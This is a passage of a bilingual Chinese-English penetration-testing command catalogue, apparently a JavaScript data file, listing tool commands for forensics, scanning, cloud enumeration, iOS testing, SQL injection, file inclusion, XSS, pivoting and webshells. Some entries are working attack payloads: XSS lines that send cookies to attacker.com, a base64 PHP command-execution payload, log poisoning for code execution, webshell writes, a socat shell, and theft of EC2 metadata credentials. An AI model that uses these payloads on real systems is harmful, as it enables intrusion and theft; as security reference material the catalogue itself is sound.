    installation: 'apt install foremost testdisk autopsy volatility3 sleuthkit',
    commands: [
      { name: { zh: '磁盘镜像分析', en: 'Disk image analysis' }, command: 'file disk.img\nfdisk -l disk.img\nmount -o loop,offset=$((512*2048)) disk.img /mnt/\nmmls disk.img  # sleuthkit', description: { zh: '分析和挂载磁盘镜像', en: 'Analyze and mount disk images' }, platform: 'linux' },
      { name: { zh: '文件雕刻', en: 'File carving' }, command: 'foremost -i disk.img -o carved/\nphotorec disk.img\nscalpel disk.img -o output/', description: { zh: '从磁盘镜像恢复文件', en: 'Recover files from disk image' }, platform: 'linux' },
      { name: { zh: 'PCAP 分析', en: 'PCAP analysis' }, command: "tshark -r traffic.pcap -Y 'http' -T fields -e http.request.full_uri\ntshark -r traffic.pcap --export-objects http,./http_objects/\nstrings traffic.pcap | grep -i 'flag\\|CTF\\|password'", description: { zh: '分析 PCAP 网络流量文件', en: 'Analyze PCAP network traffic files' }, platform: 'all' },
      { name: { zh: 'PDF 分析', en: 'PDF analysis' }, command: 'pdfinfo document.pdf\npdfextract document.pdf\npdf-parser document.pdf\npeepdf document.pdf', description: { zh: '分析 PDF 文件中的隐藏内容', en: 'Analyze hidden content in PDF files' }, platform: 'all' },
      { name: { zh: 'Office 文件分析', en: 'Office file analysis' }, command: 'olevba document.docm\nmacro_pack.py -d document.xlsm\noffice-js-hijack document.xlsx\noletools document.doc', description: { zh: '分析 Office 文件中的宏和恶意内容', en: 'Analyze macros and malicious content in Office files' }, platform: 'all' },
      { name: { zh: '内存镜像快速分析', en: 'Quick memory analysis' }, command: 'vol3 -f memory.raw windows.info\nvol3 -f memory.raw windows.pslist > procs.txt\nvol3 -f memory.raw windows.netscan > network.txt\nvol3 -f memory.raw windows.malfind > suspicious.txt', description: { zh: '内存镜像快速全面分析', en: 'Quick comprehensive memory image analysis' }, platform: 'all' }
    ],
    references: ['https://github.com/volatilityfoundation/volatility3', 'https://www.sleuthkit.org/']
  },
  {
    id: 'nmap-advanced',
    name: { zh: 'Nmap 高级用法', en: 'Nmap Advanced Usage' },
    description: { zh: 'Nmap 高级扫描技术、NSE 脚本和规避检测', en: 'Advanced Nmap scanning techniques, NSE scripts, and detection evasion' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install nmap',
    commands: [
      { name: { zh: '综合扫描', en: 'Comprehensive scan' }, command: 'nmap -sC -sV -p- --min-rate 1000 -T4 -oA full_scan target\n# -p- 全端口 -sC 默认脚本 -sV 版本', description: { zh: '全端口综合版本和脚本扫描', en: 'Full port comprehensive version and script scan' }, platform: 'all' },
      { name: { zh: 'Ping 扫描', en: 'Host discovery' }, command: 'nmap -sn 192.168.1.0/24\nnmap -PE -PP -PS80,443 -PA3389 192.168.1.0/24', description: { zh: '只做主机发现，不扫端口', en: 'Host discovery only, no port scan' }, platform: 'all' },
      { name: { zh: '漏洞脚本扫描', en: 'Vulnerability script scan' }, command: 'nmap --script=vuln target\nnmap --script=exploit target\nnmap --script "smb-vuln*" -p 445 target', description: { zh: '使用 NSE 漏洞脚本扫描', en: 'Scan using NSE vulnerability scripts' }, platform: 'all' },
      { name: { zh: '规避防火墙', en: 'Firewall evasion' }, command: 'nmap -f target  # 分片\nnmap --mtu 24 target\nnmap -D RND:10 target  # 诱饵扫描\nnmap --source-port 53 target  # 伪造源端口', description: { zh: '规避防火墙和 IDS 的扫描技术', en: 'Evasion techniques against firewalls and IDS' }, platform: 'all' },
      { name: { zh: 'HTTP 枚举', en: 'HTTP enumeration' }, command: 'nmap -sV --script=http-enum,http-methods,http-title -p 80,443 target\nnmap --script=http-auth,http-userdir-enum target', description: { zh: 'HTTP 服务枚举脚本', en: 'HTTP service enumeration scripts' }, platform: 'all' },
      { name: { zh: 'XML 输出解析', en: 'Parse XML output' }, command: 'nmap -oX scan.xml target\n# 转为 HTML\nxsltproc scan.xml -o scan.html\n# 提取开放端口\ngrep "portid" scan.xml | grep \'state="open"\'', description: { zh: 'Nmap XML 输出和解析', en: 'Nmap XML output and parsing' }, platform: 'all' }
    ],
    references: ['https://nmap.org/book/nse.html']
  },


  {
    id: 'web-recon-tools',
    name: { zh: 'Web 侦察工具集', en: 'Web Reconnaissance Toolkit' },
    description: { zh: 'Web 资产发现和侦察常用工具命令', en: 'Common web asset discovery and reconnaissance tool commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install github.com/projectdiscovery/katana/cmd/katana@latest',
    commands: [
      { name: { zh: 'Katana 爬虫', en: 'Katana crawl' }, command: 'katana -u https://target.com -d 3 -o urls.txt\nkatana -u https://target.com -jc -kf all  # 爬取 JS 中的端点', description: { zh: '爬取目标网站所有 URL', en: 'Crawl all URLs from target website' }, platform: 'all' },
      { name: { zh: 'GAU 历史 URL', en: 'GAU historical URLs' }, command: 'gau target.com | tee gau_urls.txt\ngau --subs target.com  # 包含子域名', description: { zh: '获取历史存档 URL', en: 'Fetch archived historical URLs' }, platform: 'all' },
      { name: { zh: 'Hakrawler 爬虫', en: 'Hakrawler spider' }, command: 'echo "https://target.com" | hakrawler -d 3 -subs\necho "https://target.com" | hakrawler -js  # 只看 JS 文件', description: { zh: '爬取目标 JS 和链接', en: 'Spider target for JS files and links' }, platform: 'linux' },
      { name: { zh: 'waybackurls', en: 'Wayback URLs' }, command: 'waybackurls target.com | tee wayback.txt\n# 过滤参数 URL\nwaybackurls target.com | grep "=" | anew params.txt', description: { zh: '从 Wayback Machine 获取历史 URL', en: 'Fetch historical URLs from Wayback Machine' }, platform: 'all' },
      { name: { zh: 'Gitleaks 密钥扫描', en: 'Gitleaks secret scan' }, command: 'gitleaks detect --source . -v\ngitleaks detect --source . --report-format json -o leaks.json', description: { zh: '扫描代码仓库中的密钥泄露', en: 'Scan code repositories for secret leaks' }, platform: 'all' },
      { name: { zh: 'Trufflehog 密钥扫描', en: 'TruffleHog secret scan' }, command: 'trufflehog git https://github.com/target/repo\ntrufflehog filesystem /path/to/code --json', description: { zh: '深度扫描 Git 历史中的密钥', en: 'Deep scan Git history for secrets' }, platform: 'all' },
      { name: { zh: 'Subdomainizer JS 分析', en: 'Subdomainizer JS analysis' }, command: 'python3 SubDomainizer.py -u https://target.com -o subdomains.txt\npython3 SubDomainizer.py -l urls.txt -o subdomains.txt', description: { zh: '从 JS 文件提取子域名', en: 'Extract subdomains from JavaScript files' }, platform: 'all' }
    ],
    references: ['https://github.com/projectdiscovery/katana', 'https://github.com/lc/gau']
  },
  {
    id: 'cloud-aws-pentest',
    name: { zh: 'AWS 云安全测试', en: 'AWS Cloud Security Testing' },
    description: { zh: 'AWS 云环境权限测试和错误配置检测命令', en: 'AWS cloud environment permission testing and misconfiguration detection' },
    category: { zh: '云原生安全', en: 'Cloud Native Security' },
    installation: 'pip install awscli boto3 / apt install awscli',
    commands: [
      { name: { zh: '凭证配置', en: 'Credential setup' }, command: 'aws configure\n# 或环境变量\nexport AWS_ACCESS_KEY_ID=AKIA...\nexport AWS_SECRET_ACCESS_KEY=...', description: { zh: '配置 AWS 访问凭证', en: 'Configure AWS access credentials' }, platform: 'all' },
      { name: { zh: '身份确认', en: 'Verify identity' }, command: 'aws sts get-caller-identity\naws iam get-user', description: { zh: '确认当前 AWS 身份', en: 'Confirm current AWS identity' }, platform: 'all' },
      { name: { zh: '枚举权限', en: 'Enumerate permissions' }, command: 'aws iam list-attached-user-policies --user-name user\naws iam list-user-policies --user-name user\n# enumerate-iam\npython3 enumerate-iam.py --access-key AKIA... --secret-key ...', description: { zh: '枚举当前账户的 IAM 权限', en: 'Enumerate IAM permissions for current account' }, platform: 'all' },
      { name: { zh: 'S3 枚举', en: 'S3 enumeration' }, command: 'aws s3 ls\naws s3 ls s3://bucket-name\naws s3 cp s3://bucket-name/file .\n# 公开 bucket 检查\naws s3 ls s3://target-bucket --no-sign-request', description: { zh: '枚举和访问 S3 存储桶', en: 'Enumerate and access S3 buckets' }, platform: 'all' },
      { name: { zh: 'EC2 实例枚举', en: 'EC2 enumeration' }, command: 'aws ec2 describe-instances --query "Reservations[*].Instances[*].[InstanceId,PublicIpAddress,State.Name]"\naws ec2 describe-security-groups', description: { zh: '枚举 EC2 实例和安全组', en: 'Enumerate EC2 instances and security groups' }, platform: 'all' },
      { name: { zh: '元数据服务攻击', en: 'Metadata service attack' }, command: '# IMDSv1 (SSRF 利用)\ncurl http://169.254.169.254/latest/meta-data/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\ncurl http://169.254.169.254/latest/user-data/', description: { zh: '通过 SSRF 利用 EC2 元数据服务', en: 'Exploit EC2 metadata service via SSRF' }, platform: 'all' },
      { name: { zh: 'Lambda 枚举', en: 'Lambda enumeration' }, command: 'aws lambda list-functions\naws lambda get-function --function-name target\naws lambda get-function-configuration --function-name target', description: { zh: '枚举 Lambda 函数', en: 'Enumerate Lambda functions' }, platform: 'all' }
    ],
    references: ['https://github.com/andresriancho/enumerate-iam', 'https://github.com/RhinoSecurityLabs/pacu']
  },
  {
    id: 'pacu',
    name: 'Pacu',
    description: { zh: 'AWS 渗透测试框架，自动化 AWS 攻击和枚举', en: 'AWS penetration testing framework for automated AWS attack and enumeration' },
    category: { zh: '云原生安全', en: 'Cloud Native Security' },
    installation: 'pip install pacu / git clone https://github.com/RhinoSecurityLabs/pacu',
    commands: [
      { name: { zh: '启动 Pacu', en: 'Start Pacu' }, command: 'python3 pacu.py', description: { zh: '启动 Pacu 交互式框架', en: 'Start Pacu interactive framework' }, platform: 'all' },
      { name: { zh: '导入凭证', en: 'Import credentials' }, command: 'import_keys profile_name\n# 或直接设置\nset_keys', description: { zh: '导入 AWS 凭证到 Pacu', en: 'Import AWS credentials into Pacu' }, platform: 'all' },
      { name: { zh: '权限枚举', en: 'Permission enumeration' }, command: 'run iam__enum_permissions\nrun iam__enum_users_roles_policies_groups', description: { zh: '枚举 IAM 权限', en: 'Enumerate IAM permissions' }, platform: 'all' },
      { name: { zh: 'S3 侦察', en: 'S3 reconnaissance' }, command: 'run s3__enum_bucket_data\nrun s3__get_bucket_acls', description: { zh: '枚举 S3 存储桶和 ACL', en: 'Enumerate S3 buckets and ACLs' }, platform: 'all' },
      { name: { zh: '权限提升', en: 'Privilege escalation' }, command: 'run iam__privesc_scan\n# 自动检测权限提升路径', description: { zh: '扫描 IAM 权限提升路径', en: 'Scan for IAM privilege escalation paths' }, platform: 'all' }
    ],
    references: ['https://github.com/RhinoSecurityLabs/pacu']
  },
  {
    id: 'ios-pentest',
    name: { zh: 'iOS 安全测试命令', en: 'iOS Security Testing Commands' },
    description: { zh: 'iOS 应用安全测试和分析命令', en: 'iOS application security testing and analysis commands' },
    category: { zh: '移动安全', en: 'Mobile Security' },
    installation: 'pip install frida-tools objection / apt install ideviceinstaller',
    commands: [
      { name: { zh: 'Objection 注入', en: 'Objection injection' }, command: 'objection -g com.target.app explore\n# 连接已 Patch 的 IPA\nobjection explore', description: { zh: '使用 Objection 动态分析', en: 'Dynamic analysis using Objection' }, platform: 'all' },
      { name: { zh: 'SSL Pinning 绕过', en: 'SSL pinning bypass' }, command: '# Objection\nobjection -g com.target.app explore\nios sslpinning disable\n# Frida\nfrida -U -f com.target.app -l ssl-bypass.js', description: { zh: '绕过 iOS SSL 证书固定', en: 'Bypass iOS SSL certificate pinning' }, platform: 'all' },
      { name: { zh: '文件系统访问', en: 'Filesystem access' }, command: 'objection -g com.target.app explore\nios bundles list_bundles\nenv  # 查看应用目录\nfile cat /var/mobile/Containers/Data/Application/UUID/Documents/db.sqlite', description: { zh: '访问 iOS 应用文件系统', en: 'Access iOS app filesystem' }, platform: 'all' },
      { name: { zh: '越狱检测绕过', en: 'Jailbreak detection bypass' }, command: 'ios jailbreak disable\n# Frida\nfrida -U -f com.target.app -l anti-jailbreak-bypass.js', description: { zh: '绕过 iOS 越狱检测', en: 'Bypass iOS jailbreak detection' }, platform: 'all' },
      { name: { zh: 'Frida 脚本注入', en: 'Frida script injection' }, command: 'frida -U -f com.target.app -l hook.js --no-pause\n# 列出方法\nfrida -U com.target.app -l list_methods.js', description: { zh: 'Frida 脚本注入分析', en: 'Frida script injection analysis' }, platform: 'all' }
    ],
    references: ['https://github.com/sensepost/objection', 'https://frida.re/']
  },


  {
    id: 'gobuster-advanced',
    name: { zh: 'Gobuster 高级用法', en: 'Gobuster Advanced Usage' },
    description: { zh: 'Gobuster 目录/子域名/VHOST 爆破高级用法', en: 'Advanced Gobuster directory, subdomain, and VHOST brute force usage' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install gobuster / go install github.com/OJ/gobuster/v3@latest',
    commands: [
      { name: { zh: 'VHOST 爆破', en: 'VHOST brute force' }, command: 'gobuster vhost -u http://target.com -w subdomains.txt --append-domain\ngobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt', description: { zh: '爆破虚拟主机名', en: 'Brute force virtual hostnames' }, platform: 'linux' },
      { name: { zh: 'DNS 子域名', en: 'DNS subdomain' }, command: 'gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r 8.8.8.8', description: { zh: 'DNS 子域名枚举', en: 'DNS subdomain enumeration' }, platform: 'linux' },
      { name: { zh: 'S3 桶枚举', en: 'S3 bucket enumeration' }, command: 'gobuster s3 -w buckets.txt', description: { zh: '枚举 AWS S3 存储桶', en: 'Enumerate AWS S3 buckets' }, platform: 'linux' },
      { name: { zh: '常用字典路径', en: 'Common wordlist paths' }, command: '/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n/usr/share/seclists/Discovery/Web-Content/big.txt\n/usr/share/wordlists/dirb/common.txt\n/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt', description: { zh: 'SecLists 常用字典位置', en: 'SecLists common wordlist locations' }, platform: 'linux' }
    ],
    references: ['https://github.com/OJ/gobuster']
  },
  {
    id: 'nuclei-advanced',
    name: { zh: 'Nuclei 高级用法', en: 'Nuclei Advanced Usage' },
    description: { zh: 'Nuclei 高级模板用法和大规模扫描', en: 'Advanced Nuclei template usage and large-scale scanning' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',
    commands: [
      { name: { zh: '管道联动', en: 'Pipeline integration' }, command: 'subfinder -d target.com -silent | httpx -silent | nuclei -t cves/ -severity critical,high', description: { zh: '子域名发现 → 存活检测 → 漏洞扫描', en: 'Subdomain discovery → alive check → vulnerability scan pipeline' }, platform: 'all' },
      { name: { zh: '指定标签扫描', en: 'Tag-based scan' }, command: 'nuclei -u https://target.com -tags sqli,xss,ssrf\nnuclei -u https://target.com -tags cve', description: { zh: '按漏洞标签过滤模板', en: 'Filter templates by vulnerability tag' }, platform: 'all' },
      { name: { zh: '自定义速率', en: 'Custom rate limiting' }, command: 'nuclei -l urls.txt -rl 50 -c 10 -timeout 5', description: { zh: '限制请求速率和并发数', en: 'Limit request rate and concurrency' }, platform: 'all' },
      { name: { zh: '自定义模板', en: 'Custom template' }, command: "# 简单模板示例\nid: custom-check\ninfo:\n  name: Custom Check\n  severity: medium\nrequests:\n  - method: GET\n    path:\n      - '{{BaseURL}}/admin'\n    matchers:\n      - type: status\n        status: [200]", description: { zh: '编写自定义 Nuclei 模板', en: 'Write a custom Nuclei template' }, platform: 'all' }
    ],
    references: ['https://nuclei.projectdiscovery.io/templating-guide/']
  },
  {
    id: 'burpsuite-advanced',
    name: { zh: 'Burp Suite 高级用法', en: 'Burp Suite Advanced Usage' },
    description: { zh: 'Burp Suite Pro 高级功能：主动扫描、Collaborator、扩展开发', en: 'Burp Suite Pro advanced features: active scanning, Collaborator, extension development' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: { zh: '下载: https://portswigger.net/burp/pro', en: 'Download from: https://portswigger.net/burp/pro' },
    commands: [
      { name: { zh: 'Intruder 攻击类型', en: 'Intruder attack types' }, command: 'Sniper: 单位置单字典\nBattering Ram: 多位置同一值\nPitchfork: 多位置并行字典\nCluster Bomb: 多位置笛卡尔积\n# 推荐: Cluster Bomb 用于凭证爆破', description: { zh: 'Intruder 四种攻击模式说明', en: 'Intruder four attack mode descriptions' }, platform: 'all' },
      { name: { zh: 'Collaborator 测试', en: 'Collaborator OOB testing' }, command: '# 在请求中插入 Collaborator 域名\nXXE: <!DOCTYPE x [<!ENTITY xxe SYSTEM "http://COLLAB.burpcollaborator.net/">]>\nSSRF: X-Forwarded-For: http://COLLAB.burpcollaborator.net\n# 查看 Burp Collaborator Client 接收的请求', description: { zh: '使用 Collaborator 测试 OOB 漏洞', en: 'Test OOB vulnerabilities using Collaborator' }, platform: 'all' },
      { name: { zh: 'Match and Replace', en: 'Match and Replace rules' }, command: 'Proxy -> Options -> Match and Replace\n# 常用规则:\n# 自动添加 X-Forwarded-For: 127.0.0.1\n# 替换 User-Agent\n# 注入自定义 Header', description: { zh: '配置请求/响应自动替换规则', en: 'Configure automatic request/response replacement rules' }, platform: 'all' },
      { name: { zh: 'Turbo Intruder', en: 'Turbo Intruder' }, command: '# 安装 BApp: Turbo Intruder\n# 竞争条件测试脚本\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30)\n    for i in range(30):\n        engine.queue(target.req)', description: { zh: '高速并发请求，测试竞争条件', en: 'High-speed concurrent requests for race condition testing' }, platform: 'all' }
    ],
    references: ['https://portswigger.net/burp/documentation']
  },
  {
    id: 'git-pentest',
    name: { zh: 'Git 信息泄露测试', en: 'Git Information Disclosure Testing' },
    description: { zh: '测试和利用 Git 仓库和 .git 目录信息泄露', en: 'Test and exploit Git repository and .git directory information disclosure' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'pip install GitHacker / git clone https://github.com/arthaud/git-dumper',
    commands: [
      { name: { zh: 'Git 目录泄露检测', en: 'Git directory leak check' }, command: 'curl -s https://target.com/.git/HEAD\ncurl -s https://target.com/.git/config', description: { zh: '检测 .git 目录是否公开', en: 'Check if .git directory is publicly accessible' }, platform: 'all' },
      { name: { zh: 'git-dumper 下载', en: 'git-dumper download' }, command: 'python3 git_dumper.py https://target.com/.git/ ./dumped_repo\ncd dumped_repo && git log --oneline', description: { zh: '下载泄露的 .git 目录', en: 'Download exposed .git directory' }, platform: 'all' },
      { name: { zh: 'GitHacker', en: 'GitHacker' }, command: 'python3 githacker.py --url http://target.com/.git/ --output-folder ./output\ncd output && git log --all --oneline', description: { zh: '恢复泄露的 Git 仓库', en: 'Recover exposed Git repository' }, platform: 'all' },
      { name: { zh: '历史记录搜索', en: 'Search git history' }, command: 'git log --all --oneline\ngit show HEAD~3:src/config.php\ngit grep "password" $(git rev-list --all)', description: { zh: '搜索 Git 历史中的敏感信息', en: 'Search sensitive information in Git history' }, platform: 'all' }
    ],
    references: ['https://github.com/arthaud/git-dumper']
  },
  {
    id: 'sqlmap-advanced',
    name: { zh: 'SQLMap 高级用法', en: 'SQLMap Advanced Usage' },
    description: { zh: 'SQLMap 高级选项：Tamper 脚本、Burp 集成、高级注入', en: 'SQLMap advanced options: tamper scripts, Burp integration, advanced injection' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'apt install sqlmap / git clone https://github.com/sqlmapproject/sqlmap',
    commands: [
      { name: { zh: 'Burp 请求文件', en: 'From Burp request file' }, command: '# 在 Burp 中右键保存请求到文件\nsqlmap -r request.txt --batch --random-agent', description: { zh: '从 Burp Suite 保存的请求文件测试', en: 'Test from a Burp Suite saved request file' }, platform: 'all' },
      { name: { zh: 'WAF 绕过 Tamper', en: 'WAF bypass tamper scripts' }, command: "sqlmap -u 'http://target.com/?id=1' --tamper=space2comment,between,randomcase\nsqlmap -u 'http://target.com/?id=1' --tamper=charunicodeescape\n# 列出所有 tamper\nsqlmap --list-tampers", description: { zh: '使用 Tamper 脚本绕过 WAF', en: 'Use tamper scripts to bypass WAF' }, platform: 'all' },
      { name: { zh: '写 WebShell', en: 'Write WebShell' }, command: "sqlmap -u 'http://target.com/?id=1' --os-shell\nsqlmap -u 'http://target.com/?id=1' --file-write=shell.php --file-dest=/var/www/html/shell.php", description: { zh: '通过 SQL 注入写入 WebShell', en: 'Write WebShell via SQL injection' }, platform: 'all' },
      { name: { zh: 'JSON POST 注入', en: 'JSON POST injection' }, command: "sqlmap -u 'http://target.com/api/v1/user' --data='{\"id\":1}' --headers='Content-Type: application/json' -p id", description: { zh: '测试 JSON 格式 POST 请求', en: 'Test JSON format POST requests' }, platform: 'all' },
      { name: { zh: 'Cookie 注入', en: 'Cookie injection' }, command: "sqlmap -u 'http://target.com/dashboard' --cookie='session=abc123; id=1' -p id", description: { zh: '测试 Cookie 参数注入', en: 'Test Cookie parameter injection' }, platform: 'all' }
    ],
    references: ['https://github.com/sqlmapproject/sqlmap/wiki/Usage']
  },


  {
    id: 'lfi-rfi-tools',
    name: { zh: 'LFI/RFI 利用工具', en: 'LFI/RFI Exploitation Tools' },
    description: { zh: '本地/远程文件包含漏洞利用和工具命令', en: 'Local/remote file inclusion vulnerability exploitation tools and commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'pip install liffy / git clone https://github.com/D35m0nd142/LFISuite',
    commands: [
      { name: { zh: 'LFI 基础测试', en: 'Basic LFI test' }, command: "curl 'http://target.com/page?file=../../../etc/passwd'\ncurl 'http://target.com/page?file=....//....//....//etc/passwd'\ncurl 'http://target.com/page?file=php://filter/convert.base64-encode/resource=index.php'", description: { zh: 'LFI 常见绕过测试', en: 'Common LFI bypass tests' }, platform: 'all' },
      { name: { zh: 'PHP 封装协议', en: 'PHP wrapper protocols' }, command: "# 读取 PHP 源码\ncurl 'http://target.com/?file=php://filter/read=convert.base64-encode/resource=config'\n# Data URI 执行\ncurl 'http://target.com/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id'\n# Phar 反序列化\ncurl 'http://target.com/?file=phar://./upload/evil.jpg'", description: { zh: 'PHP 封装协议利用', en: 'PHP wrapper protocol exploitation' }, platform: 'all' },
      { name: { zh: '日志投毒 LFI → RCE', en: 'Log poisoning LFI to RCE' }, command: '# 在 User-Agent 中注入 PHP\ncurl -A "<?php system($_GET[cmd]); ?>" http://target.com\n# 包含日志\ncurl "http://target.com/?file=/var/log/apache2/access.log&cmd=id"', description: { zh: '通过日志投毒实现 LFI 到 RCE', en: 'LFI to RCE via log poisoning' }, platform: 'all' },
      { name: { zh: 'LFISuite 自动利用', en: 'LFISuite auto exploit' }, command: 'python3 LFISuite.py', description: { zh: '自动化 LFI 利用工具', en: 'Automated LFI exploitation tool' }, platform: 'linux' }
    ],
    references: ['https://book.hacktricks.xyz/pentesting-web/file-inclusion']
  },
  {
    id: 'xss-tools',
    name: { zh: 'XSS 利用工具', en: 'XSS Exploitation Tools' },
    description: { zh: 'XSS 扫描、利用和 Payload 工具命令', en: 'XSS scanning, exploitation, and payload tool commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'pip install xssstrike / go install github.com/hahwul/dalfox/v2@latest',
    commands: [
      { name: { zh: 'XSStrike 扫描', en: 'XSStrike scan' }, command: "python3 xssstrike.py -u 'http://target.com/search?q=test'\npython3 xssstrike.py -u 'http://target.com/search?q=test' --crawl", description: { zh: '智能 XSS 扫描', en: 'Intelligent XSS scanning' }, platform: 'all' },
      { name: { zh: 'Dalfox 扫描', en: 'Dalfox scan' }, command: "dalfox url http://target.com/search?q=test\necho 'http://target.com/search?q=test' | dalfox pipe\ncat urls.txt | dalfox pipe -o results.txt", description: { zh: 'Dalfox 快速 XSS 扫描', en: 'Fast XSS scan with Dalfox' }, platform: 'all' },
      { name: { zh: 'Cookie 窃取 Payload', en: 'Cookie theft payload' }, command: "<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>\n<img src=x onerror=fetch('http://attacker.com/'+document.cookie)>\n<script>document.location='http://attacker.com/?'+document.cookie</script>", description: { zh: 'XSS Cookie 窃取 Payload', en: 'XSS cookie theft payloads' }, platform: 'all' },
      { name: { zh: 'XSS Hunter 接收', en: 'XSS Hunter receive' }, command: '# XSS Hunter Payload (https://xsshunter.trufflesecurity.com/)\n"><script src="https://YOUR_XSSHUNTER.xss.ht"></script>\n# 接收截图和 Cookie', description: { zh: '使用 XSS Hunter 接收盲打 XSS', en: 'Use XSS Hunter to receive blind XSS' }, platform: 'all' }
    ],
    references: ['https://github.com/s0md3v/XSStrike', 'https://github.com/hahwul/dalfox']
  },
  {
    id: 'network-pivoting',
    name: { zh: '网络枢转与代理', en: 'Network Pivoting and Proxy' },
    description: { zh: '内网枢转、跨网段攻击和代理链技术命令', en: 'Internal network pivoting, cross-segment attacks, and proxy chaining commands' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    commands: [
      { name: { zh: 'SSH 动态代理', en: 'SSH dynamic proxy' }, command: 'ssh -D 1080 -N user@jump_host\n# proxychains4 配置\necho "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf\nproxychains4 nmap -sT -Pn 10.10.20.0/24', description: { zh: 'SSH 建立 SOCKS5 代理', en: 'Establish SOCKS5 proxy through SSH' }, platform: 'linux' },
      { name: { zh: 'Meterpreter 路由', en: 'Meterpreter route add' }, command: 'meterpreter> run autoroute -s 10.10.20.0/24\nmeterpreter> background\nmsf> route add 10.10.20.0/24 1\nmsf> use auxiliary/server/socks_proxy\nset SRVPORT 1080; run', description: { zh: 'Meterpreter 添加路由和 SOCKS', en: 'Add Metasploit route and SOCKS proxy' }, platform: 'linux' },
      { name: { zh: 'Socat 端口转发', en: 'Socat port forwarding' }, command: '# 目标机上转发\nsocat TCP-LISTEN:8080,fork TCP:10.10.20.5:80\n# 双向转发\nsocat TCP-LISTEN:4444,fork EXEC:/bin/sh', description: { zh: 'Socat 端口转发和反弹 Shell', en: 'Socat port forwarding and reverse shell' }, platform: 'linux' },
      { name: { zh: 'Netsh 端口转发 (Windows)', en: 'Netsh port forwarding (Windows)' }, command: 'netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.20.5\nnetsh interface portproxy show all\nnetsh interface portproxy delete v4tov4 listenport=8080', description: { zh: 'Windows Netsh 端口转发', en: 'Windows Netsh port forwarding' }, platform: 'windows' },
      { name: { zh: '双重代理', en: 'Double proxy' }, command: '# 机器A → 机器B (SOCKS5) → 机器C (SOCKS5) → 内网\n# /etc/proxychains4.conf\nsocks5 127.0.0.1 1080  # A→B\nsocks5 127.0.0.1 1081  # B→C\nproxychains4 curl http://intranet_host', description: { zh: '多级代理链配置', en: 'Multi-hop proxy chain configuration' }, platform: 'linux' }
    ],
    references: ['https://github.com/haad/proxychains']
  },
  {
    id: 'web-shells',
    name: { zh: 'WebShell 和 CMS 工具', en: 'WebShells and CMS Tools' },
    description: { zh: 'WebShell 管理和 CMS 漏洞利用工具命令', en: 'WebShell management and CMS vulnerability exploitation tool commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'pip install weevely / apt install whatweb',
    commands: [
      { name: { zh: 'Weevely WebShell', en: 'Weevely WebShell' }, command: '# 生成 WebShell\nweevely generate mypassword shell.php\n# 连接\nweevely http://target.com/shell.php mypassword\n# 执行命令\nweevely http://target.com/shell.php mypassword ":shell.php id"', description: { zh: 'Weevely 生成和连接 WebShell', en: 'Generate and connect WebShell with Weevely' }, platform: 'linux' },
      { name: { zh: 'Antsword/中国蚁剑', en: 'AntSword WebShell Manager' }, command: '# AntSword: GUI 工具\n# 支持 PHP/ASP/ASPX/JSP\n# 连接URL: http://target.com/shell.php\n# 密码: ant\n# 脚本类型: PHP', description: { zh: 'AntSword 图形化 WebShell 管理', en: 'AntSword graphical WebShell management' }, platform: 'all' },
      { name: { zh: 'WPScan WordPress', en: 'WPScan for WordPress' }, command: 'wpscan --url https://target.com --enumerate u,p,t,tt\nwpscan --url https://target.com -U admin -P wordlist.txt\nwpscan --url https://target.com --api-token TOKEN', description: { zh: 'WordPress 漏洞扫描和爆破', en: 'WordPress vulnerability scan and brute force' }, platform: 'all' },
      { name: { zh: 'Droopescan CMS', en: 'Droopescan CMS scan' }, command: 'droopescan scan drupal -u http://target.com\ndroopescan scan silverstripe -u http://target.com\ndroopescan scan -u http://target.com', description: { zh: '多种 CMS 漏洞扫描', en: 'Multi-CMS vulnerability scanning' }, platform: 'all' }
    ],
    references: ['https://github.com/epinna/weevely3']
  },
  {
    id: 'cloud-azure-pentest',
    name: { zh: 'Azure 云安全测试', en: 'Azure Cloud Security Testing' },
    description: { zh: 'Microsoft Azure 云环境权限测试命令', en: 'Microsoft Azure cloud environment permission testing commands' },
    category: { zh: '云原生安全', en: 'Cloud Native Security' },
    installation: 'pip install azure-cli / pip install ROADtools',
    commands: [
      { name: { zh: 'Az CLI 登录', en: 'Azure CLI login' }, command: 'az login\naz login --service-principal -u app_id -p password --tenant tenant_id', description: { zh: '登录 Azure 账户', en: 'Log in to Azure account' }, platform: 'all' },
      { name: { zh: '身份确认', en: 'Verify identity' }, command: 'az account show\naz ad signed-in-user show', description: { zh: '确认当前 Azure 身份', en: 'Confirm current Azure identity' }, platform: 'all' },
      { name: { zh: '资源枚举', en: 'Resource enumeration' }, command: 'az resource list\naz vm list -o table\naz storage account list\naz keyvault list', description: { zh: '枚举 Azure 资源', en: 'Enumerate Azure resources' }, platform: 'all' },
